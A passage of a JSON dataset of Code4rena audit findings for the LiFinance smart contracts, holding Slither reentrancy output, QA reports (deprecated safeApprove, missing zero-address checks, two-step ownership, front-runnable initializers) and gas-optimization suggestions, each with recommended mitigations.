_anyswapData.amount}(_anyswapData.token,_anyswapData.recipient,_anyswapData.toChainId) (src/Facets/AnyswapFacet.sol#137-141)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\tEvent emitted after the call(s):\n\t- LiFiTransferStarted(_lifiData.transactionId,_lifiData.integrator,_lifiData.referrer,_lifiData.sendingAssetId,_lifiData.receivingAssetId,_lifiData.receiver,_lifiData.amount,_lifiData.destinationChainId,block.timestamp) (src/Facets/AnyswapFacet.sol#112-122)\nReentrancy in CBridgeFacet.swapAndStartBridgeTokensViaCBridge(ILiFi.LiFiData,LibSwap.SwapData[],CBridgeFacet.CBridgeData) (src/Facets/CBridgeFacet.sol#92-134):\n\tExternal calls:\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/CBridgeFacet.sol#101)\n\t\t- SafeERC20.safeTransferFrom(IERC20(assetId),from,to,amount) (src/Libraries/LibAsset.sol#100)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol#92)\n\t\t- LibAsset.transferFromERC20(fromAssetId,msg.sender,address(this),fromAmount) (src/Libraries/LibSwap.sol#34)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- LibSwap.swap(_lifiData.transactionId,_swapData[i]) (src/Facets/Swapper.sol#20)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,0) (src/Libraries/LibAsset.sol#67)\n\t\t- LibAsset.approveERC20(IERC20(fromAssetId),_swapData.approveTo,fromAmount) (src/Libraries/LibSwap.sol#38)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,MAX_INT) (src/Libraries/LibAsset.sol#68)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/CBridgeFacet.sol#112)\n\t\t- SafeERC20.safeTransferFrom(IERC20(assetId),from,to,amount) (src/Libraries/LibAsset.sol#100)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol#92)\n\t\t- LibAsset.transferFromERC20(fromAssetId,msg.sender,address(this),fromAmount) (src/Libraries/LibSwap.sol#34)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- LibSwap.swap(_lifiData.transactionId,_swapData[i]) (src/Facets/Swapper.sol#20)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,0) (src/Libraries/LibAsset.sol#67)\n\t\t- LibAsset.approveERC20(IERC20(fromAssetId),_swapData.approveTo,fromAmount) (src/Libraries/LibSwap.sol#38)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,MAX_INT) (src/Libraries/LibAsset.sol#68)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\t- _startBridge(_cBridgeData) (src/Facets/CBridgeFacet.sol#121)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol#92)\n\t\t- ICBridge(bridge).sendNative(_cBridgeData.receiver,_cBridgeData.amount,_cBridgeData.dstChainId,_cBridgeData.nonce,_cBridgeData.maxSlippage) (src/Facets/CBridgeFacet.sol#150-156)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- LibAsset.approveERC20(IERC20(_cBridgeData.token),bridge,_cBridgeData.amount) (src/Facets/CBridgeFacet.sol#159)\n\t\t- ICBridge(bridge).send(_cBridgeData.receiver,_cBridgeData.token,_cBridgeData.amount,_cBridgeData.dstChainId,_cBridgeData.nonce,_cBridgeData.maxSlippage) (src/Facets/CBridgeFacet.sol#161-168)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,0) (src/Libraries/LibAsset.sol#67)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,MAX_INT) (src/Libraries/LibAsset.sol#68)\n\tExternal calls sending eth:\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/CBridgeFacet.sol#101)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/CBridgeFacet.sol#112)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\t- _startBridge(_cBridgeData) (src/Facets/CBridgeFacet.sol#121)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\tEvent emitted after the call(s):\n\t- LiFiTransferStarted(_lifiData.transactionId,_lifiData.integrator,_lifiData.referrer,_lifiData.sendingAssetId,_lifiData.receivingAssetId,_lifiData.receiver,_lifiData.amount,_lifiData.destinationChainId,block.timestamp) (src/Facets/CBridgeFacet.sol#123-133)\nReentrancy in HopFacet.swapAndStartBridgeTokensViaHop(ILiFi.LiFiData,LibSwap.SwapData[],HopFacet.HopData) (src/Facets/HopFacet.sol#95-126):\n\tExternal calls:\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/HopFacet.sol#105)\n\t\t- SafeERC20.safeTransferFrom(IERC20(assetId),from,to,amount) (src/Libraries/LibAsset.sol#100)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol#92)\n\t\t- LibAsset.transferFromERC20(fromAssetId,msg.sender,address(this),fromAmount) (src/Libraries/LibSwap.sol#34)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- LibSwap.swap(_lifiData.transactionId,_swapData[i]) (src/Facets/Swapper.sol#20)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,0) (src/Libraries/LibAsset.sol#67)\n\t\t- LibAsset.approveERC20(IERC20(fromAssetId),_swapData.approveTo,fromAmount) (src/Libraries/LibSwap.sol#38)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,MAX_INT) (src/Libraries/LibAsset.sol#68)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\t- _startBridge(_hopData) (src/Facets/HopFacet.sol#113)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol#92)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,0) (src/Libraries/LibAsset.sol#67)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,MAX_INT) (src/Libraries/LibAsset.sol#68)\n\t\t- LibAsset.approveERC20(IERC20(sendingAssetId),bridge,_hopData.amount) (src/Facets/HopFacet.sol#149)\n\t\t- IHopBridge(bridge).sendToL2{value: value}(_hopData.chainId,_hopData.recipient,_hopData.amount,_hopData.destinationAmountOutMin,_hopData.destinationDeadline,address(0),0) (src/Facets/HopFacet.sol#155-163)\n\t\t- IHopBridge(bridge).swapAndSend{value: value}(_hopData.chainId,_hopData.recipient,_hopData.amount,_hopData.bonderFee,_hopData.amountOutMin,_hopData.deadline,_hopData.destinationAmountOutMin,_hopData.destinationDeadline) (src/Facets/HopFacet.sol#167-176)\n\tExternal calls sending eth:\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/HopFacet.sol#105)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\t- _startBridge(_hopData) (src/Facets/HopFacet.sol#113)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- IHopBridge(bridge).sendToL2{value: value}(_hopData.chainId,_hopData.recipient,_hopData.amount,_hopData.destinationAmountOutMin,_hopData.destinationDeadline,address(0),0) (src/Facets/HopFacet.sol#155-163)\n\t\t- IHopBridge(bridge).swapAndSend{value: value}(_hopData.chainId,_hopData.recipient,_hopData.amount,_hopData.bonderFee,_hopData.amountOutMin,_hopData.deadline,_hopData.destinationAmountOutMin,_hopData.destinationDeadline) (src/Facets/HopFacet.sol#167-176)\n\tEvent emitted after the call(s):\n\t- LiFiTransferStarted(_lifiData.transactionId,_lifiData.integrator,_lifiData.referrer,_lifiData.sendingAssetId,_lifiData.receivingAssetId,_lifiData.receiver,_lifiData.amount,_lifiData.destinationChainId,block.timestamp) (src/Facets/HopFacet.sol#115-125)\nReentrancy in NXTPFacet.swapAndStartBridgeTokensViaNXTP(ILiFi.LiFiData,LibSwap.SwapData[],ITransactionManager.PrepareArgs) (src/Facets/NXTPFacet.sol#85-115):\n\tExternal calls:\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/NXTPFacet.sol#94)\n\t\t- SafeERC20.safeTransferFrom(IERC20(assetId),from,to,amount) (src/Libraries/LibAsset.sol#100)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol#92)\n\t\t- LibAsset.transferFromERC20(fromAssetId,msg.sender,address(this),fromAmount) (src/Libraries/LibSwap.sol#34)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- LibSwap.swap(_lifiData.transactionId,_swapData[i]) (src/Facets/Swapper.sol#20)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,0) (src/Libraries/LibAsset.sol#67)\n\t\t- LibAsset.approveERC20(IERC20(fromAssetId),_swapData.approveTo,fromAmount) (src/Libraries/LibSwap.sol#38)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,MAX_INT) (src/Libraries/LibAsset.sol#68)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\t- _startBridge(_lifiData.transactionId,_nxtpData) (src/Facets/NXTPFacet.sol#102)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol#92)\n\t\t- LibAsset.approveERC20(IERC20(sendingAssetId),address(s.nxtpTxManager),_nxtpData.amount) (src/Facets/NXTPFacet.sol#180)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- result = s.nxtpTxManager.prepare{value: value}(_nxtpData) (src/Facets/NXTPFacet.sol#185)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,0) (src/Libraries/LibAsset.sol#67)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,MAX_INT) (src/Libraries/LibAsset.sol#68)\n\tExternal calls sending eth:\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/NXTPFacet.sol#94)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\t- _startBridge(_lifiData.transactionId,_nxtpData) (src/Facets/NXTPFacet.sol#102)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- result = s.nxtpTxManager.prepare{value: value}(_nxtpData) (src/Facets/NXTPFacet.sol#185)\n\tEvent emitted after the call(s):\n\t- LiFiTransferStarted(_lifiData.transactionId,_lifiData.integrator,_lifiData.referrer,_lifiData.sendingAssetId,_lifiData.receivingAssetId,_lifiData.receiver,_lifiData.amount,_lifiData.destinationChainId,block.timestamp) (src/Facets/NXTPFacet.sol#104-114)\n\t- NXTPBridgeStarted(_transactionId,result.transactionId,result) (src/Facets/NXTPFacet.sol#187)\n\t\t- _startBridge(_lifiData.transactionId,_nxtpData) (src/Facets/NXTPFacet.sol#102)\nReentrancy in GenericSwapFacet.swapTokensGeneric(ILiFi.LiFiData,LibSwap.SwapData[]) (src/Facets/GenericSwapFacet.sol#22-43):\n\tExternal calls:\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/GenericSwapFacet.sol#26)\n\t\t- SafeERC20.safeTransferFrom(IERC20(assetId),from,to,amount) (src/Libraries/LibAsset.sol#100)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol#92)\n\t\t- LibAsset.transferFromERC20(fromAssetId,msg.sender,address(this),fromAmount) (src/Libraries/LibSwap.sol#34)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- LibSwap.swap(_lifiData.transactionId,_swapData[i]) (src/Facets/Swapper.sol#20)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,0) (src/Libraries/LibAsset.sol#67)\n\t\t- LibAsset.approveERC20(IERC20(fromAssetId),_swapData.approveTo,fromAmount) (src/Libraries/LibSwap.sol#38)\n\t\t- SafeERC20.safeApprove(IERC20(assetId),spender,MAX_INT) (src/Libraries/LibAsset.sol#68)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\t- LibAsset.transferAsset(_lifiData.receivingAssetId,address(msg.sender),postSwapBalance) (src/Facets/GenericSwapFacet.sol#30)\n\tExternal calls sending eth:\n\t- _executeSwaps(_lifiData,_swapData) (src/Facets/GenericSwapFacet.sol#26)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#131)\n\t\t- (success,res) = _swapData.callTo.call{value: msg.value}(_swapData.callData) (src/Libraries/LibSwap.sol#42)\n\tEvent emitted after the call(s):\n\t- LiFiTransferStarted(_lifiData.transactionId,_lifiData.integrator,_lifiData.referrer,_lifiData.sendingAssetId,_lifiData.receivingAssetId,_lifiData.receiver,_lifiData.amount,_lifiData.destinationChainId,block.timestamp) (src/Facets/GenericSwapFacet.sol#32-42)\nReentrancy in WithdrawFacet.withdraw(address,address,uint256) (src/Facets/WithdrawFacet.sol#20-38):\n\tExternal calls:\n\t- IERC20(_assetAddress).safeTransfer(sendTo,_amount) (src/Facets/WithdrawFacet.sol#35)\n\tExternal calls sending eth:\n\t- address(sendTo).transfer(_amount) (src/Facets/WithdrawFacet.sol#31)\n\tEvent emitted after the call(s):\n\t- LogWithdraw(sendTo,_assetAddress,_amount) (src/Facets/WithdrawFacet.sol#37)\n\t```",
    "dataSource": {
      "name": "code-423n4/2022-03-lifinance-findings",
      "repo": "https://github.com/code-423n4/2022-03-lifinance-findings",
      "url": "https://github.com/code-423n4/2022-03-lifinance-findings/issues/197"
    }
  },
  {
    "title": "QA Report",
    "body": "# C4-001 : Safe Approve Function Is Deprecated\n\n## Impact\n\nOn the LibAsset contract, It has been observed that to safeIncreaseAllowance and safeDecreaseAllowance are defined however they are not used. On the other hand (https://github.com/OpenZeppelin/openzeppelin-contracts/pull/2268) safeApprove function is deprecated.\n\n\n## Proof of Concept\n\n1. In the swap functions, approveERC20 function has been used. \n2. Navigate to the following contract.\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Libraries/LibAsset.sol#L67\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider to enable functions and use safeIncreaseAllowance and safeDecreaseAllowance instead of safeApprove.\n\n\n# C4-002 : Incompatibility With Rebasing/Deflationary/Inflationary tokens\n\n## Impact -  LOW\n\nLiFinance protocol do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Libraries/LibAsset.sol#L84\n```\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\n- Ensure that to check previous balance/after balance  equals to amount for any rebasing/inflation/deflation\n- Add support in contracts for such tokens before accepting user-supplied tokens\n- Consider supporting deflationary / rebasing / etc tokens by extra checking the balances before/after or strictly inform your users not to use such tokens if they don't want to lose them.\n\n\n# C4-003 : Missing zero-address check in constructors and the setter functions\n\n## Impact -  LOW\n\nMissing checks for zero-addresses may lead to infunctional protocol, if the variable addresses are updated incorrectly.\n\n## Proof of Concept\n\n1. Navigate to the following all contract functions.\n\n```\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/LiFiDiamond.sol#L8\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider adding zero-address checks in the discussed constructors:\nrequire(newAddr != address(0));.\n\n# C4-004 : transferOwnership should be two step process\n\n## Impact -  LOW\n\nThe current ownership transfer process involves the current owner calling Unlock.transferOwnership(). This function checks the new owner is not the zero address and proceeds to write the new owner's address into the owner's state variable. If the nominated EOA account is not a valid account, it is entirely possible the owner may accidentally transfer ownership to an uncontrolled account, breaking all functions with the onlyOwner() modifier. Lack of two-step procedure for critical operations leaves them error-prone\nif the address is incorrect, the new address will take on the functionality of the new role immediately\n\nfor Ex : -Alice deploys a new version of the whitehack group address. When she invokes the whitehack group address setter to replace the address, she accidentally enters the wrong address. The new address now has access to the role immediately and is too late to revert\n\n\n## Proof of Concept\n\n1. Navigate to \"https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/OwnershipFacet.sol#L8\".\n2. The contracts have many onlyOwner function.\n3. The contract is inherited from the Ownable which includes transferOwnership.\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nImplement zero address check and Consider implementing a two step process where the owner nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of ownership to fully succeed. This ensures the nominated EOA account is a valid and active account.\n\n# C4-005 : Front-runnable Initializers\n\n## Impact - LOW\n\nAll contract **initializers** were missing access controls, allowing any user to initialize the contract. By front-running the contract deployers to initialize the contract, the incorrect parameters may be supplied, leaving the contract needing to be redeployed.\n\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-03-prepo/blob/d62d7146b27fd39a5f1358ffde08766724886cf5/contracts/core/Collateral.sol#L38\n```\n\n2. initialize functions does not have access control. They are vulnerable to front-running.\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nWhile the code that can be run in contract constructors is limited, setting the owner in the contract's constructor to the `msg.sender` and adding the `onlyOwner` modifier to all **initializers** would be a sufficient level of access control.\n\n# C4-006 :  Consider making contracts Pausable\n\n## Impact -  LOW\n\nThere are many external risks so my suggestion is that you should consider making the contracts pausable, so in case of an unexpected event, the admin can pause transfers.\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider making contracts Pausable https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol.\n\n# C4-007 : Critical changes should use two-step procedure\n\n## Impact - NON CRITICAL\n\nThe critical procedures should be two step process.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Libraries/LibDiamond.sol#L101\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.\n\n# C4-008 : # DoS With Block Gas Limit\n\n## Impact -  Non-Critical\n\nWhen smart contracts are deployed or functions inside them are called, the execution of these actions always requires a certain amount of gas, based of how much computation is needed to complete them. The Ethereum network specifies a block gas limit and the sum of all transactions included in a block can not exceed the threshold.\n\nProgramming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. Modifying an array of unknown size, that increases in size over time, can lead to such a Denial of Service condition.\n\n## Proof of Concept\n\n1. Follow the functions shown below.\n\n```\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Libraries/LibDiamond.sol#L116\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Libraries/LibDiamond.sol#L110\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Libraries/LibDiamond.sol#L125\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/Swapper.sol#L14\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/DiamondLoupeFacet.sol#L24\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nCaution is advised when you expect to have large arrays that grow over time. Actions that require looping across the entire data structure should be avoided.\n\nIf you absolutely must loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions.\n\n\n# C4-009 : # Missing Re-entrancy Guard\n\n## Impact\n\nThe re-entrancy guard is missing on the Eth anchor interaction. The external router interaction can cause to the re-entrancy vulnerability.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Libraries/LibSwap.sol#L42\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/GenericSwapFacet.sol#L30\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/NXTPFacet.sol#L137\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nFollow the check effect interaction pattern or put re-entrancy guard.\n",
    "dataSource": {
      "name": "code-423n4/2022-03-lifinance-findings",
      "repo": "https://github.com/code-423n4/2022-03-lifinance-findings",
      "url": "https://github.com/code-423n4/2022-03-lifinance-findings/issues/190"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report (Low / Non-Critical)\n* There is no zero address check in `constructor` function for the owner address in `LiFiDiamond.sol`\n* Usage of deprecated `safeApprove`. [Link](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#SafeERC20-safeApprove-contract-IERC20-address-uint256-)\n* Require statements are missing for `addFunction()` in  `LibDiamond.sol`\n\nTeam can consider adding statements as;\n```Solidity\nrequire(_selector != 0, \"Error msg here\");\nrequire(_facetAddress != address(0), \"Error msg here\");\n```\n* Remove sol-hints on various locations.\n* Statement should be corrected to **native asset** rather than **ether** for correct guidance in `LibAsset.sol#L42-L45` \n* Remove bug related *todo* at `WithdrawFacet.sol#L29`\n* No amount check is carried out at `LibAsset.sol` inside `transferNativeAsset()`\n* `enforceHasContractCode` in `LibDiamond.sol` should not be relied on if the target is a contract inside the construction. [Reference is here](https://docs.openzeppelin.com/contracts/2.x/api/utils#Address-isContract-address-)\n* Redundant `if` statement in `LibDiamond.sol#196` since the statement is assumed as not succeeded.\n* Emit event at `LibDiamond.sol#79` can be considered to be thrown after `initializeDiamondCut` function success.",
    "dataSource": {
      "name": "code-423n4/2022-03-lifinance-findings",
      "repo": "https://github.com/code-423n4/2022-03-lifinance-findings",
      "url": "https://github.com/code-423n4/2022-03-lifinance-findings/issues/188"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1. `> 0` is less efficient than `!= 0`\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/AnyswapFacet.sol#L92\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/NXTPFacet.sol#L98\n\nRecommended Mitigation Steps:\nChange to:\n```\nrequire(_postSwapBalance != 0, \"ERR_INVALID_AMOUNT\");\n```\n\n========================================================================\n\n2. Use of uint8 in for loop increases gas costs\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/HopFacet.sol#L48\n\nRecommended Mitigation Steps:\nChange `uint8` to `uint256`\n\n========================================================================\n\n3. changing `i++` to `++i` can save gas\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/HopFacet.sol#L48\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/DiamondLoupeFacet.sol#L24\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/DexManagerFacet.sol#L33\n\nRecommended Mitigation Steps:\nChange `i++` to `++i`\n\n========================================================================\n\n4. != 0 is a cheaper operation compared to > 0, when dealing with uint\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Libraries/LibDiamond.sol#L121\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Libraries/LibDiamond.sol#L189\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Libraries/LibDiamond.sol#L196\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Libraries/LibDiamond.sol#L212\n\nRecommended Mitigation Steps:\nReplace `>` with `! = `\n\n========================================================================\n\n5. the best way to use `SafeERC20.function` for gas opt\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/WithdrawFacet.sol#L9\n\nRecommended Mitigation Steps:\nby not declaring:\n```\nusing SafeERC20 for IERC20;\n```\n\nand use:\n```\nSafeERC20.safeTransfer(IERC20(_assetAddress), sendTo, _amount);\n```\n\n========================================================================",
    "dataSource": {
      "name": "code-423n4/2022-03-lifinance-findings",
      "repo": "https://github.com/code-423n4/2022-03-lifinance-findings",
      "url": "https://github.com/code-423n4/2022-03-lifinance-findings/issues/183"
    }
  },
  {
    "title": "QA Report",
    "body": "Inconsistency with approveERC20 function:\n- https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibAsset.sol#L67\n- If a user already has the ERC20 approved with the DEX, the current code can lead to an error.\n- Specifically, if they've approved the DEX for X tokens previously (where X > 0), and then they request a swap for Y tokens (where Y > X), the result will be decreasing their allowance to 0.\n- Recommended Mitigation: use SafeERC20.safeIncreaseAllowance(IERC20(assetId), spender, MAX_INT) on this line instead.",
    "dataSource": {
      "name": "code-423n4/2022-03-lifinance-findings",
      "repo": "https://github.com/code-423n4/2022-03-lifinance-findings",
      "url": "https://github.com/code-423n4/2022-03-lifinance-findings/issues/179"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1. Execution functionSelector first for saving gas\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/LiFiDiamond.sol#L12-L13\n\nfunction order will also have an impact on gas consumption. Because this contract, there is a difference in order of the function\nso this implementation below can be using for saving more gas (±12 gas)\n\n##Tool Used \nRemix\n\n#POC\n```\n        IDiamondCut.FacetCut[] memory cut = new IDiamondCut.FacetCut[](1);\n        bytes4[] memory functionSelectors = new bytes4[](1);\n        functionSelectors[0] = IDiamondCut.diamondCut.selector;\n        cut[0] = IDiamondCut.FacetCut({\n            facetAddress: _diamondCutFacet,\n            action: IDiamondCut.FacetCutAction.Add,\n            functionSelectors: functionSelectors\n        });\n        LibDiamond.diamondCut(cut, address(0), \"\");\n    }\n```\ncan be changed into :\n```\n        bytes4[] memory functionSelectors = new bytes4[](1);\n        IDiamondCut.FacetCut[] memory cut = new IDiamondCut.FacetCut[](1);   \n        functionSelectors[0] = IDiamondCut.diamondCut.selector;\n        cut[0] = IDiamondCut.FacetCut({\n            facetAddress: _diamondCutFacet,\n            action: IDiamondCut.FacetCutAction.Add,\n            functionSelectors: functionSelectors\n        });\n        LibDiamond.diamondCut(cut, address(0), \"\");\n    }\n```\n\n2. Using ++i instead i++ for saving more gas\n\nUsing i++ instead ++i for  all the loops, the variable i is incremented using i++. It is known that implementation by using ++i costs less gas per iteration than i++.\n## Tools Used\nRemix\n\n## Occurances\n\n```\nmain/src/Facets/Swapper.sol#L14\nmain/src/Facets/HopFacet.sol#L48\nmain/src/Facets/DiamondLoupeFacet.sol#L24\nmain/src/Facets/DexManagerFacet.sol#L33\nmain/src/Facets/DexManagerFacet.sol#L52\nmain/src/Facets/DexManagerFacet.sol#L65\n```\n\n3. Removing && operator can saving more gas\n\ninstead of using operator && on single require check. using additional require check can save more gas.\n\n##Tool Used\nRemix\n\n##POC\n\n```\nrequire(\n        ls.dexWhitelist[_swapData[i].approveTo] == true && ls.dexWhitelist[_swapData[i].callTo] == true,\n        \"Contract call not allowed!\"\n        );\n```\n\ncan be changed to :\n\n```\nrequire(ls.dexWhitelist[_swapData[i].approveTo] == true, \"Contract call not allowed!\");\nrequire(ls.dexWhitelist[_swapData[i].callTo] == true, \"Contract call not allowed!\");\n```\n\n4. Using `require` instead of `Assert` for saving more gas\n\nAssert-style exceptions consume all gas available to the call. on other hand, using require-style exception will not consume any gas. \nit would be saving more gas by using require instead of assert.\n\n##Tool Used \nRemix\n\n##POC\n\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/WithdrawFacet.sol#L30\nhttps://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/WithdrawFacet.sol#L34\n\n```\n            assert(_amount <= self.balance);\n            assert(_amount <= assetBalance);\n```\n\nchange to \n\n```\n\t    require(_amount <= self.balance);\n            require(_amount <= assetBalance);\n```\n\n5. Optimize order for struct 